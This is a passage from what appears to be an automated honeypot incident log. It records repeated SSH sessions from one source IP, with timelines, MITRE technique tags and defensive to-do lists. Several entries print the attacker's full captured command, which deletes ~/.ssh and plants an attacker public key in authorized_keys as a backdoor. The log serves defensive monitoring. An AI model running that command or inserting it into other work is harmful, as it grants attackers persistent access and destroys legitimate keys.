| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:41:09` | `cowrie.session.connect` |
| `2026-04-05 17:41:09` | `cowrie.client.version` |
| `2026-04-05 17:41:09` | `cowrie.client.kex` |
| `2026-04-05 17:41:11` | `cowrie.login.success` |
| `2026-04-05 17:41:11` | `cowrie.session.params` |
| `2026-04-05 17:41:11` | `cowrie.command.input` |
| `2026-04-05 17:41:11` | `cowrie.command.failed` |
| `2026-04-05 17:41:12` | `cowrie.log.closed` |
| `2026-04-05 17:41:12` | `cowrie.session.params` |
| `2026-04-05 17:41:12` | `cowrie.command.input` |
| `2026-04-05 17:41:13` | `cowrie.session.file_download` |
| `2026-04-05 17:41:13` | `cowrie.log.closed` |
| `2026-04-05 17:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bb6da9b3888

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:41 |
| **Last Seen** | 2026-04-05 17:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:41:16` | `cowrie.session.connect` |
| `2026-04-05 17:41:16` | `cowrie.client.version` |
| `2026-04-05 17:41:17` | `cowrie.client.kex` |
| `2026-04-05 17:41:18` | `cowrie.login.success` |
| `2026-04-05 17:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-770f27906046

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:42 |
| **Last Seen** | 2026-04-05 17:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:42:12` | `cowrie.session.connect` |
| `2026-04-05 17:42:12` | `cowrie.client.version` |
| `2026-04-05 17:42:12` | `cowrie.client.kex` |
| `2026-04-05 17:42:14` | `cowrie.login.success` |
| `2026-04-05 17:42:14` | `cowrie.session.params` |
| `2026-04-05 17:42:14` | `cowrie.command.input` |
| `2026-04-05 17:42:14` | `cowrie.command.failed` |
| `2026-04-05 17:42:15` | `cowrie.log.closed` |
| `2026-04-05 17:42:15` | `cowrie.session.params` |
| `2026-04-05 17:42:15` | `cowrie.command.input` |
| `2026-04-05 17:42:16` | `cowrie.session.file_download` |
| `2026-04-05 17:42:16` | `cowrie.log.closed` |
| `2026-04-05 17:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb680e9b29f7

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:42 |
| **Last Seen** | 2026-04-05 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:42:19` | `cowrie.session.connect` |
| `2026-04-05 17:42:19` | `cowrie.client.version` |
| `2026-04-05 17:42:19` | `cowrie.client.kex` |
| `2026-04-05 17:42:21` | `cowrie.login.success` |
| `2026-04-05 17:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a8d85974578

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:46 |
| **Last Seen** | 2026-04-05 17:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:46:28` | `cowrie.session.connect` |
| `2026-04-05 17:46:28` | `cowrie.client.version` |
| `2026-04-05 17:46:28` | `cowrie.client.kex` |
| `2026-04-05 17:46:29` | `cowrie.login.success` |
| `2026-04-05 17:46:30` | `cowrie.session.params` |
| `2026-04-05 17:46:30` | `cowrie.command.input` |
| `2026-04-05 17:46:30` | `cowrie.command.failed` |
| `2026-04-05 17:46:30` | `cowrie.log.closed` |
| `2026-04-05 17:46:31` | `cowrie.session.params` |
| `2026-04-05 17:46:31` | `cowrie.command.input` |
| `2026-04-05 17:46:31` | `cowrie.session.file_download` |
| `2026-04-05 17:46:31` | `cowrie.log.closed` |
| `2026-04-05 17:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39dd24250a11

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:46 |
| **Last Seen** | 2026-04-05 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:46:35` | `cowrie.session.connect` |
| `2026-04-05 17:46:35` | `cowrie.client.version` |
| `2026-04-05 17:46:35` | `cowrie.client.kex` |
| `2026-04-05 17:46:36` | `cowrie.login.success` |
| `2026-04-05 17:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb9c4aa06ab1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:47 |
| **Last Seen** | 2026-04-05 17:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:47:32` | `cowrie.session.connect` |
| `2026-04-05 17:47:32` | `cowrie.client.version` |
| `2026-04-05 17:47:32` | `cowrie.client.kex` |
| `2026-04-05 17:47:34` | `cowrie.login.success` |
| `2026-04-05 17:47:34` | `cowrie.session.params` |
| `2026-04-05 17:47:34` | `cowrie.command.input` |
| `2026-04-05 17:47:34` | `cowrie.command.failed` |
| `2026-04-05 17:47:35` | `cowrie.log.closed` |
| `2026-04-05 17:47:35` | `cowrie.session.params` |
| `2026-04-05 17:47:35` | `cowrie.command.input` |
| `2026-04-05 17:47:36` | `cowrie.session.file_download` |
| `2026-04-05 17:47:36` | `cowrie.log.closed` |
| `2026-04-05 17:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cc4cd88bde0

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:47 |
| **Last Seen** | 2026-04-05 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:47:39` | `cowrie.session.connect` |
| `2026-04-05 17:47:39` | `cowrie.client.version` |
| `2026-04-05 17:47:39` | `cowrie.client.kex` |
| `2026-04-05 17:47:41` | `cowrie.login.success` |
| `2026-04-05 17:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b445c257d267

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:49 |
| **Last Seen** | 2026-04-05 17:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:49:40` | `cowrie.session.connect` |
| `2026-04-05 17:49:40` | `cowrie.client.version` |
| `2026-04-05 17:49:40` | `cowrie.client.kex` |
| `2026-04-05 17:49:41` | `cowrie.login.success` |
| `2026-04-05 17:49:42` | `cowrie.session.params` |
| `2026-04-05 17:49:42` | `cowrie.command.input` |
| `2026-04-05 17:49:42` | `cowrie.command.failed` |
| `2026-04-05 17:49:42` | `cowrie.log.closed` |
| `2026-04-05 17:49:43` | `cowrie.session.params` |
| `2026-04-05 17:49:43` | `cowrie.command.input` |
| `2026-04-05 17:49:43` | `cowrie.session.file_download` |
| `2026-04-05 17:49:43` | `cowrie.log.closed` |
| `2026-04-05 17:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f7e4dc962e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:49 |
| **Last Seen** | 2026-04-05 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:49:47` | `cowrie.session.connect` |
| `2026-04-05 17:49:47` | `cowrie.client.version` |
| `2026-04-05 17:49:47` | `cowrie.client.kex` |
| `2026-04-05 17:49:49` | `cowrie.login.success` |
| `2026-04-05 17:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-884dce53fdd5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:50 |
| **Last Seen** | 2026-04-05 17:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:50:46` | `cowrie.session.connect` |
| `2026-04-05 17:50:46` | `cowrie.client.version` |
| `2026-04-05 17:50:46` | `cowrie.client.kex` |
| `2026-04-05 17:50:48` | `cowrie.login.success` |
| `2026-04-05 17:50:48` | `cowrie.session.params` |
| `2026-04-05 17:50:48` | `cowrie.command.input` |
| `2026-04-05 17:50:48` | `cowrie.command.failed` |
| `2026-04-05 17:50:49` | `cowrie.log.closed` |
| `2026-04-05 17:50:49` | `cowrie.session.params` |
| `2026-04-05 17:50:49` | `cowrie.command.input` |
| `2026-04-05 17:50:50` | `cowrie.session.file_download` |
| `2026-04-05 17:50:50` | `cowrie.log.closed` |
| `2026-04-05 17:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d15695e203

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:50 |
| **Last Seen** | 2026-04-05 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:50:53` | `cowrie.session.connect` |
| `2026-04-05 17:50:53` | `cowrie.client.version` |
| `2026-04-05 17:50:53` | `cowrie.client.kex` |
| `2026-04-05 17:50:55` | `cowrie.login.success` |
| `2026-04-05 17:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-646a87f1a04f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:53 |
| **Last Seen** | 2026-04-05 17:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:53:55` | `cowrie.session.connect` |
| `2026-04-05 17:53:55` | `cowrie.client.version` |
| `2026-04-05 17:53:55` | `cowrie.client.kex` |
| `2026-04-05 17:53:56` | `cowrie.login.success` |
| `2026-04-05 17:53:57` | `cowrie.session.params` |
| `2026-04-05 17:53:57` | `cowrie.command.input` |
| `2026-04-05 17:53:57` | `cowrie.command.failed` |
| `2026-04-05 17:53:57` | `cowrie.log.closed` |
| `2026-04-05 17:53:58` | `cowrie.session.params` |
| `2026-04-05 17:53:58` | `cowrie.command.input` |
| `2026-04-05 17:53:58` | `cowrie.session.file_download` |
| `2026-04-05 17:53:58` | `cowrie.log.closed` |
| `2026-04-05 17:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-882546d281da

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:54 |
| **Last Seen** | 2026-04-05 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:54:02` | `cowrie.session.connect` |
| `2026-04-05 17:54:02` | `cowrie.client.version` |
| `2026-04-05 17:54:02` | `cowrie.client.kex` |
| `2026-04-05 17:54:03` | `cowrie.login.success` |
| `2026-04-05 17:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c75b0a50c520

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:58 |
| **Last Seen** | 2026-04-05 17:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:58:11` | `cowrie.session.connect` |
| `2026-04-05 17:58:11` | `cowrie.client.version` |
| `2026-04-05 17:58:11` | `cowrie.client.kex` |
| `2026-04-05 17:58:12` | `cowrie.login.success` |
| `2026-04-05 17:58:13` | `cowrie.session.params` |
| `2026-04-05 17:58:13` | `cowrie.command.input` |
| `2026-04-05 17:58:13` | `cowrie.command.failed` |
| `2026-04-05 17:58:13` | `cowrie.log.closed` |
| `2026-04-05 17:58:14` | `cowrie.session.params` |
| `2026-04-05 17:58:14` | `cowrie.command.input` |
| `2026-04-05 17:58:14` | `cowrie.session.file_download` |
| `2026-04-05 17:58:14` | `cowrie.log.closed` |
| `2026-04-05 17:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cc1e65a5fa4

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:58 |
| **Last Seen** | 2026-04-05 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:58:18` | `cowrie.session.connect` |
| `2026-04-05 17:58:18` | `cowrie.client.version` |
| `2026-04-05 17:58:18` | `cowrie.client.kex` |
| `2026-04-05 17:58:19` | `cowrie.login.success` |
| `2026-04-05 17:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6a09412e3c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 17:59 |
| **Last Seen** | 2026-04-05 17:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:59:12` | `cowrie.session.connect` |
| `2026-04-05 17:59:12` | `cowrie.client.version` |
| `2026-04-05 17:59:12` | `cowrie.client.kex` |
| `2026-04-05 17:59:13` | `cowrie.login.success` |
| `2026-04-05 17:59:14` | `cowrie.session.params` |
| `2026-04-05 17:59:14` | `cowrie.command.input` |
